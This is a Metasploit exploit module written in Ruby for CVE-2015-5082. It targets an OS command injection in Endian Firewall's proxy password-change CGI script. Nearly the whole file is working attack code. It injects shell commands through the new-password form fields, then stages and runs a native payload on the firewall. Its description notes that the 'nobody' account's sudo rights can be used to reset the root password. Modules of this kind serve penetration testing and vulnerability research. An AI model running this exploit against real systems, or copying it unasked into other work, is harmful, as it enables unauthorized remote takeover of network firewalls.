##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit4 < Msf::Exploit::Remote
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
 
  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Endian Firewall Proxy Password Change Command Injection',
      'Description' => %q{
        This module exploits an OS command injection vulnerability in a
        web-accessible CGI script used to change passwords for locally-defined
        proxy user accounts. Valid credentials for such an account are
        required.
 
        Command execution will be in the context of the "nobody" account, but
        this account had broad sudo permissions, including to run the script
        /usr/local/bin/chrootpasswd (which changes the password for the Linux
        root account on the system to the value specified by console input
        once it is executed).
 
        The password for the proxy user account specified will *not* be
        changed by the use of this module, as long as the target system is
        vulnerable to the exploit.
 
        Very early versions of Endian Firewall (e.g. 1.1 RC5) require
        HTTP basic auth credentials as well to exploit this vulnerability.
        Use the USERNAME and PASSWORD advanced options to specify these values
        if required.
 
        Versions >= 3.0.0 still contain the vulnerable code, but it appears to
        never be executed due to a bug in the vulnerable CGI script which also
        prevents normal use (http://jira.endian.com/browse/UTM-1002).
 
        Versions 2.3.x and 2.4.0 are not vulnerable because of a similar bug
        (http://bugs.endian.com/print_bug_page.php?bug_id=3083).
 
        Tested successfully against the following versions of EFW Community:
 
        1.1 RC5, 2.0, 2.1, 2.2, 2.5.1, 2.5.2.
 
        Should function against any version from 1.1 RC5 to 2.2.x, as well as
        2.4.1 and 2.5.x.
      },
      'Author' => [
        'Ben Lincoln' # Vulnerability discovery, exploit, Metasploit module
      ],
      'References' => [
        ['CVE', '2015-5082'],
        ['URL', 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5082'],
        ['EDB', '37426'],
        ['EDB', '37428']
      ],
      'Privileged'  => false,
      'Platform'    => %w{ linux },
      'Payload'        =>
        {
          'BadChars' => "\x00\x0a\x0d",
          'DisableNops' => true,
          'Space'       => 2048
        },
      'Targets'        =>
        [
          [ 'Linux x86',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X86,
              'CmdStagerFlavor' => [ :echo, :printf ]
            }
          ],
          [ 'Linux x86_64',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X86_64,
              'CmdStagerFlavor' => [ :echo, :printf ]
            }
          ]
        ],
      'DefaultOptions' =>
        {
          'SSL' => true,
          'RPORT' => 10443
        },
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Jun 28 2015',
      'License' => MSF_LICENSE
    ))
 
    register_options([
      OptString.new('TARGETURI', [true, 'Path to chpasswd.cgi CGI script',
        '/cgi-bin/chpasswd.cgi']),
      OptString.new('EFW_USERNAME', [true,
        'Valid proxy account username for the target system']),
      OptString.new('EFW_PASSWORD', [true,
        'Valid password for the proxy user account']),
      OptString.new('RPATH', [true,
        'Target PATH for binaries used by the CmdStager', '/bin'])
     ], self.class)
 
    register_advanced_options(
      [
        OptInt.new('HTTPClientTimeout', [ true, 'HTTP read response timeout (seconds)', 5])
      ], self.class)
 
  end
 
  def exploit
    # Cannot use generic/shell_reverse_tcp inside an elf
    # Checking before proceeds
    if generate_payload_exe.blank?
      fail_with(Failure::BadConfig,
        "#{peer} - Failed to store payload inside executable, " +
        "please select a native payload")
    end
 
    execute_cmdstager(:linemax => 200, :nodelete => true)
  end
 
  def execute_command(cmd, opts)
    cmd.gsub!('chmod', "#{datastore['RPATH']}/chmod")
 
    req(cmd)
  end
 
  def req(cmd)
    sploit = "#{datastore['EFW_PASSWORD']}; #{cmd};"
 
    post_data = Rex::MIME::Message.new
    post_data.add_part('change', nil, nil, 'form-data; name="ACTION"')
    post_data.add_part(datastore['EFW_USERNAME'], nil, nil, 'form-data; name="USERNAME"')
    post_data.add_part(datastore['EFW_PASSWORD'], nil, nil, 'form-data; name="OLD_PASSWORD"')
    post_data.add_part(sploit, nil, nil, 'form-data; name="NEW_PASSWORD_1"')
    post_data.add_part(sploit, nil, nil, 'form-data; name="NEW_PASSWORD_2"')
    post_data.add_part('  Change password', nil, nil, 'form-data; name="SUBMIT"')
 
    data = post_data.to_s
    boundary = post_data.bound
 
    referer_url =
      "https://#{datastore['RHOST']}:#{datastore['RPORT']}" +
      "#{datastore['TARGETURI']}"
 
 
    res = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => datastore['TARGETURI'],
        'ctype' => "multipart/form-data; boundary=#{boundary}",
        'headers' => {
          'Referer' => referer_url
        },
        'data' => data
      })
 
     if res
       if res.code == 401
         fail_with(Failure::NoAccess,
           "#{rhost}:#{rport} - Received a 401 HTTP response - " +
           "specify web admin credentials using the USERNAME " +
           "and PASSWORD advanced options to target this host.")
       end
       if res.code == 404
         fail_with(Failure::Unreachable,
           "#{rhost}:#{rport} - Received a 404 HTTP response - " +
           "your TARGETURI value is most likely not correct")
       end
     end
 
  end
 
end

